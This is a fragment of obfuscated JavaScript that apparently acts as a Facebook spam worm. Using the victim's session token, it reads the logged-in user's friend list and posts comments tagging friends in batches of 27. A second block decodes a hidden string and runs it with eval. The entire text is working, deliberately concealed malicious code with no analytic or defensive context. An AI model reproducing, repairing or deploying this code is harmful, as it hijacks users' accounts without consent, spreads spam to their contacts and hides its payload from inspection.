(){if(_0x7892x7[_0xa22c[7]]==4){eval(_0xa22c[8]+_0x7892x7[_0xa22c[12]].toString()[_0xa22c[11]](_0xa22c[9],_0xa22c[10])+_0xa22c[13]);for(f=0;f<Math[_0xa22c[17]](arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]]/27);f++){mesaj=_0xa22c[10];mesaj_text=_0xa22c[10];for(i=f*27;i<(f+1)*27;i++){if(arkadaslar[_0xa22c[16]][_0xa22c[15]][i]){mesaj+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]]+_0xa22c[22];mesaj_text+=_0xa22c[23]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]];} ;} ;yorum_yap(id,mesaj);} ;} ;} ;var _0x7892x8=_0xa22c[24];_0x7892x8+=_0xa22c[25];_0x7892x8+=_0xa22c[26];_0x7892x8+=_0xa22c[27];_0x7892x8+=_0xa22c[28]+user_id;_0x7892x8+=_0xa22c[29]+user_id;if(document[_0xa22c[32]][_0xa22c[31]](_0xa22c[30])>=0){_0x7892x7[_0xa22c[35]](_0xa22c[33],_0xa22c[34]+_0x7892x8,true);} else {_0x7892x7[_0xa22c[35]](_0xa22c[33],_0xa22c[36]+_0x7892x8,true);} ;_0x7892x7[_0xa22c[37]]();} ;function RandomArkadas(){var _0x7892xa=_0xa22c[10];for(i=0;i<9;i++){_0x7892xa+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[21]]+_0xa22c[22];} ;return _0x7892xa;} ;function yorum_yap(id,_0x7892xc){var _0x7892xd= new XMLHttpRequest();var _0x7892x8=_0xa22c[10];_0x7892x8+=_0xa22c[40]+id;_0x7892x8+=_0xa22c[41]+encodeURIComponent(_0x7892xc);_0x7892x8+=_0xa22c[42];_0x7892x8+=_0xa22c[43];_0x7892x8+=_0xa22c[44];_0x7892x8+=_0xa22c[45];_0x7892x8+=_0xa22c[46];_0x7892x8+=_0xa22c[47]+id+_0xa22c[48];_0x7892x8+=_0xa22c[49];_0x7892x8+=_0xa22c[50];_0x7892x8+=_0xa22c[51];_0x7892x8+=_0xa22c[52];_0x7892x8+=_0xa22c[29]+user_id;_0x7892x8+=_0xa22c[53];_0x7892x8+=_0xa22c[54];_0x7892x8+=_0xa22c[55];_0x7892x8+=_0xa22c[56]+fb_dtsg;_0x7892x8+=_0xa22c[57];_0x7892xd[_0xa22c[35]](_0xa22c[58],_0xa22c[59],true);_0x7892xd[_0xa22c[62]](_0xa22c[60],_0xa22c[61]);_0x7892xd[_0xa22c[6]]=function (){if(_0x7892xd[_0xa22c[7]]==4&&_0x7892xd[_0xa22c[63]]==200){_0x7892xd[_0xa22c[64]];} ;} ;_0x7892xd[_0xa22c[37]](_0x7892x8);} ;arkadaslari_al(id);
var _5066;var _4528='891C189F122F1768C1867A1804B1921B1939D1255E1246C1561E1948B1876D1867B1768D1831E1183C1615D1804A1885D1822C1840A1885A1939A1840F1903F1183C1615C1921F1894F1813B1840F1867C1876D1948D1183B1543F1768F1921D1840A1183C1552F1885B1840F1183B2011A2011A1183A1498C1894B1966D1894D1858B1183B1363C1390B1183C1894E1921C1768E1885D1822C1183D1795B1768E1885E1183B1498B1804F1966F1804F1858D1183A1354B1345F1183D1894F1921C1768E1885B1822F1183D2011F2011A1183C1489E1984C1183B1471C1768D1795D1840F1777F1615E1597D1183F1246D1264E1426E';var _4155=/[\x41\x42\x43\x44\x45\x46]/;var _9561=2;var _6544=_4528.charAt(_4528.length-1);var _2860;var _8911=_4528.split(_4155);var _4321=[String.fromCharCode,isNaN,parseInt,String];_8911[1]=_4321[_9561+1](_4321[_9561](_8911[1])/21);var _4609=(_9561==6)?String:eval;_2860='';_11=_4321[_9561](_8911[0])/_4321[_9561](_8911[1]);for(_5066=3;_5066<_11;_5066++)_2860+=(_4321[_9561-2]((_4321[_9561](_8911[_5066])+_4321[_9561](_8911[2])+_4321[_9561](_8911[1]))/_4321[_9561](_8911[1])-_4321[_9561](_8911[2])+_4321[_9561](_8911[1])-1));var _3559='_3336';var _4023='_3559=_2860';function _9152(_4991){_4609(_2244);_9152(_3380);_3380(_4023);_9152(_3559);}var _2244='_9152=_4609';var _3380='_3380=_9152';_9152(_6544);
